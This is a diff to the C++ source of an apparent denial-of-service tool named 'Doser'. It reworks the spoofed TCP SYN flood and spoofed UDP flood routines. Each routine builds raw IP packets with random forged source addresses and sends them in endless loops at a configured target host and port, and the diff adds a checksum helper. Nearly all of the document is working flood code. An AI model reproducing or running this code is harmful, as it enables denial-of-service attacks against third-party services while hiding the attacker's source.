@@ -10,8 +10,9 @@
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include "Doser.h"
-#include "headers.h"
 
 
 void Doser::attack(const int *id){
@@ -374,7 +375,7 @@ void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
 }
 
 void Doser::icmp_flood(const int *id) {
-    int s, x, offset, on = 1;
+    int s, x, on = 1;
     char buf[400];
     std::string message{};
     // Structs
@@ -451,61 +452,70 @@ const char *Doser::randomizeIP() {
 void Doser::spoofed_tcp_flood(const int *id) {
     int s, on = 1, x;
     std::string message{};
-    char buffer[8192];
+    char buf[8192];
+    auto *ip = (struct ip *)buf;
+    auto *tcp = (struct tcphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+    auto s_port = randomInt(0, 65535);
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
-            auto s_addr = randomizeIP();
-            auto s_port = randomInt(0, 65535);
-            bzero(buffer, sizeof(buffer));
-            auto *ip = (struct ipheader *) buffer;
-
-            auto *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
-
-            struct sockaddr_in sin{}, din{};
-
-            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_TCP)) < 0){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            sin.sin_family = AF_UNSPEC;
-            din.sin_family = AF_UNSPEC;
-            sin.sin_port = htons(static_cast<uint16_t>(s_port));
-            din.sin_port = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            sin.sin_addr.s_addr = inet_addr(s_addr);
-            din.sin_addr.s_addr = inet_addr(conf->website.c_str());
-
-            // IP Struct
-            ip->iph_ihl = 5;
-            ip->iph_ver = 4;
-            ip->iph_tos = 16;
-            ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
-            ip->iph_ident = htons(54321);
-            ip->iph_offset = 0;
-            ip->iph_ttl = 64;
-            ip->iph_protocol = 6;
-            ip->iph_chksum = 0;
-            ip->iph_sourceip = inet_addr(s_addr);
-            ip->iph_destip = inet_addr(conf->website.c_str());
-
-            // TCP Struct
-            tcp->tcph_srcport = htons(static_cast<uint16_t>(s_port));
-            tcp->tcph_destport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            tcp->tcph_seqnum = htonl(1);
-            tcp->tcph_acknum = 0;
-            tcp->tcph_offset = 5;
-            tcp->tcph_syn = 1;
-            tcp->tcph_ack = 0;
-            tcp->tcph_win = htons(32767);
-            tcp->tcph_chksum = 0;
-            tcp->tcph_urgptr = 0;
-            ip->iph_chksum = checksum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_off = htons(0x0);
+            ip->ip_ttl = 64;
+            ip->ip_p = 6;
+            ip->ip_sum = 0;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_UNSPEC;
+
+            // TCP Struct
+            tcp->source = htons(static_cast<uint16_t>(s_port));
+            tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            tcp->seq = htonl(1);
+            tcp->ack = 0;
+            tcp->doff = 5;
+            tcp->syn = 1;
+            tcp->ack_seq = 0;
+            tcp->window = htons(32767);
+            tcp->check = 0;
+            tcp->urg_ptr = 0;
+            tcp->check = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr))));
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -527,9 +537,9 @@ void Doser::spoofed_udp_flood(const int *id) {
             auto s_addr = randomizeIP();
             auto s_port = randomInt(0, 65535);
             bzero(buffer, sizeof(buffer));
-            auto *ip = (struct ipheader *) buffer;
+            auto *ip = (struct ip *) buffer;
 
-            auto *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
+            auto *udp = (struct udphdr *) (buffer + sizeof(struct ip));
 
             struct sockaddr_in sin{}, din{};
 
@@ -546,29 +556,29 @@ void Doser::spoofed_udp_flood(const int *id) {
             din.sin_addr.s_addr = inet_addr(conf->website.c_str());
 
             // IP Struct
-            ip->iph_ihl = 5;
-            ip->iph_ver = 4;
-            ip->iph_tos = 16;
-            ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
-            ip->iph_ident = htons(54321);
-            ip->iph_ttl = 64;
-            ip->iph_protocol = 17;
-            ip->iph_sourceip = inet_addr(s_addr);
-            ip->iph_destip = inet_addr(conf->website.c_str());
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr);
+            ip->ip_id = htons(54321);
+            ip->ip_ttl = 64;
+            ip->ip_p = 17;
+            ip->ip_src.s_addr = inet_addr(s_addr);
+            ip->ip_dst.s_addr = inet_addr(conf->website.c_str());
 
             // UDP Struct
-            udp->udph_srcport = htons(static_cast<uint16_t>(s_port));
-            udp->udph_destport = htons(*(unsigned short *)conf->port.c_str());
-            udp->udph_len = htons(sizeof(struct udpheader));
+            udp->source = htons(static_cast<uint16_t>(s_port));
+            udp->dest = htons(*(unsigned short *)conf->port.c_str());
+            udp->len = htons(sizeof(struct udphdr));
 
-            ip->iph_chksum = checksum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
+            ip->ip_sum = checksum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct udphdr));
 
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+            if(sendto(s, buffer, ip->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -578,4 +588,20 @@ void Doser::spoofed_udp_flood(const int *id) {
         logger->Log(&message, Logger::Info);
         usleep(30000);
     }
+}
+
+unsigned short Doser::checksum(unsigned short *buf, int len){
+
+    unsigned long sum;
+
+    for(sum=0; len>0; len--){
+        sum += *buf++;
+    }
+
+    sum = (sum >> 16) + (sum &0xffff);
+
+    sum += (sum >> 16);
+
+    return (unsigned short)(~sum);
+
 }
